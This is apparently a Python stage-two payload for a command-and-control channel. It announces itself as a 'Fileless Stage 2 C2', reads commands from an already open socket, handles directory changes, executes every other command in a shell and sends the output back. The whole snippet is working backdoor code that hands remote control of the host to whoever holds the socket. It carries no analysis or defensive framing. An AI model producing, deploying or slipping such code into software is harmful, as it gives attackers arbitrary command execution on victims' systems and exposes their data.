import subprocess, os
def run_c2():
    global client_socket
    client_socket.send(b"\\n[+] Fileless Stage 2 C2 Initialized Successfully!\\n")
    while True:
        try:
            cmd = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd or cmd.lower() == 'exit': break
            if cmd.startswith('cd '):
                try: os.chdir(cmd[3:].strip())
                except Exception as e: client_socket.send(f"{e}\\n".encode())
                else: client_socket.send(b"\\n")
                continue
            out = subprocess.getoutput(cmd)
            client_socket.send((out + "\\n").encode('utf-8', errors='ignore'))
        except Exception:
            break
run_c2()
